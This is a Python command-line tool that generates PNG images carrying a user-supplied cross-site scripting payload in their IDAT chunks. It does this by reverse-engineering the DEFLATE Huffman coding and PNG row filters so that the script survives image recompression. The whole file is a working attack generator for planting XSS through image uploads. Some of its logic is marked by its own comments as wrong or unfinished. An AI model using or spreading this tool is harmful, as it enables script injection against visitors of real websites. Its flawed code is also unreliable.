#!/usr/bin/python3.6

import os
import sys
import zlib
import argparse
from PIL import Image


def banner():
    print(
        """               ____                    
 __  _____ ___|___ \ _ __  _ __   __ _ 
 \ \/ / __/ __| __) | '_ \| '_ \ / _` |
  >  <\__ \__ \/ __/| |_) | | | | (_| |
 /_/\_\___/___/_____| .__/|_| |_|\__, |
                    |_|          |___/
 PNG IDAT chunks XSS payload generator\n"""
    )


def parse_args():
    parser = argparse.ArgumentParser(
        description="PNG IDAT chunks XSS payload generator", epilog="Don't be evil :)"
    )
    parser.add_argument("-p", dest="payload", help="XSS Payload", required=True)
    parser.add_argument("-o", dest="output", help="Output .png file", required=True)
    return parser.parse_args()


def reverse_huffman(huffman):
    bitstream = ""
    for char in list(huffman):
        bits = f"{ord(char):08b}"
        bitstream = bits + bitstream
    bitstream = bitstream[::-1]  # strrev($bitstream);
    bitstream = bitstream[3:]  # substr($bitstream, 3);

    chars = []
    i = 0
    while len(bitstream) > 0:
        eightBits = bitstream[0:8]  # substr($bitstream, 0, 8);

        ### TODO NOT HERE
        huffman_static_codes_dict = {}
        ii = 0
        for i in range(48, 191):
            binary = "{0:b}".format(i)
            if len("{0:b}".format(i)) == 6:
                huffman_static_codes_dict.update({ii: "00" + binary})
            elif len("{0:b}".format(i)) == 7:
                huffman_static_codes_dict.update({ii: "0" + binary})
            else:
                huffman_static_codes_dict.update({ii: binary})
            ii += 1

        # 143
        for i in range(399, 512):
            binary = "{0:b}".format(i)
            huffman_static_codes_dict.update({ii: binary})
            ii += 1
        ### TODO NOT HERE

        global dec
        if eightBits in huffman_static_codes_dict.values():
            dec = list(huffman_static_codes_dict.keys())[
                list(huffman_static_codes_dict.values()).index(eightBits)
            ]
            bitstream = bitstream[8:]
        else:
            try:
                dec = list(huffman_static_codes_dict.keys())[
                    list(huffman_static_codes_dict.values()).index(bitstream[0:9])
                ]
            except:
                next
            bitstream = bitstream[9:]

        if dec:
            if dec < 256:
                chars.append(chr(dec))
            # else:
            # print("OUTOFBOUNDS")
        else:
            print("END")

    return "".join(chars)


def gzdeflate(string):
    compressor = zlib.compressobj(9, zlib.DEFLATED, -zlib.MAX_WBITS)
    compressed = compressor.compress(string)
    compressed += compressor.flush()
    return compressed


def to_ord_array(bin_string):
    return [ord(char) for char in bin_string]


def reverse_filter_1(bin_string):
    p = to_ord_array(bin_string)
    s = len(p)

    payload = []
    i = 0
    while i < (len(p) - 3):
        p[i + 3] = (p[i + 3] + p[i]) % 256
        i += 1
    for filter1 in p:
        payload.append(filter1)
    return payload


def reverse_filter_3(bin_string):
    p = to_ord_array(bin_string)
    s = len(p)

    payload = []
    i = 0
    while i < (len(p) - 3):
        p[i + 3] = (p[i + 3] + int(p[i] / 2)) % 256
        i += 1
    for filter3 in p:
        payload.append(filter3)
    return payload


def bypass_png_filters(inflate):
    one = reverse_filter_1(inflate)
    three = reverse_filter_3(inflate)
    mergedlist = one + three
    return mergedlist


def generate_final_payload(payload, png_output):
    print("[i] Generating final PNG output")
    # Thanks to admanLogue and hLk_886 for this PNG Code
    im = Image.new("RGB", (32, 32))
    i = 0
    c = 0
    while i < len(payload):
        try:
            r = payload[i]
            g = payload[i + 1]
            b = payload[i + 2]
            im.putpixel((c, 0), (r, g, b))
            i += 3
            c += 1
        except:
            payload.append(255)

    im.save(png_output)
    print("[!] PNG output saved as: %s" % png_output + "\n")


if __name__ == "__main__":
    banner()
    args = parse_args()

    input2chunk = args.payload
    print("[i] Using payload: " + input2chunk + "\n")

    failed = True
    for i in range(0xFF, 0x01, -1):
        reversed = reverse_huffman(chr(i) + input2chunk + chr(0))
        deflated = gzdeflate(bytes(reversed, encoding="utf-8"))

        ### TODO: this is just wrong
        if input2chunk in str(deflated).upper():
            break
        else:
            break

    # print ("Deflated: "+str(deflated))
    # print ("Reversed: "+str(reversed))

    payload = bypass_png_filters(str(reversed))
    generate_final_payload(payload, args.output)
